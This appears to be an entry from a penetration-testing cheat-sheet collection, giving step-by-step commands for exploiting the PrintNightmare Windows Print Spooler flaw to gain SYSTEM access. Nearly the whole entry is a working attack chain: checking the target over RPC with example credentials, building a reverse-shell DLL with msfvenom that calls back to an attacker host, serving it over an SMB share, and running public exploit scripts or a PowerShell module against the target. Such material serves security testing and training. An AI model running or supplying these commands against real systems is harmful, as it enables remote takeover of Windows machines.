---
description: |
  PrintNightmare (CVE-2021-1675 / CVE-2021-34527) — remote code execution via Windows Print Spooler vulnerability to achieve SYSTEM-level access.
commands:
  - have: Credentials
    cmd: |
      # Check if target is vulnerable — look for MS-RPRN or MS-PAR
      rpcdump.py senshu.local/sec_user:'P@ssw0rd'@10.10.10.27 | grep -E 'MS-RPRN|MS-PAR'

      # Generate malicious DLL payload
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=9001 -f dll -o evil.dll

      # Host DLL via SMB share on attacker machine
      impacket-smbserver share . -smb2support

      # Exploit — cube0x0 CVE-2021-1675
      python3 CVE-2021-1675.py senshu.local/sec_user:'P@ssw0rd'@10.10.10.27 '\\10.10.10.21\share\evil.dll'

      # Alternative — calebstewart exploit
      python3 printnightmare.py -u sec_user -p 'P@ssw0rd' -d senshu.local 10.10.10.27 '\\10.10.10.21\share\evil.dll'
  - have: Shell
    cmd: |
      Import-Module .\CVE-2021-1675.ps1
      Invoke-Nightmare -DLL "C:\Temp\evil.dll"
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
techniques:
  - CVE_Exploit
references:
  - https://github.com/cube0x0/CVE-2021-1675
  - https://github.com/calebstewart/CVE-2021-1675
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printnightmare.html
---
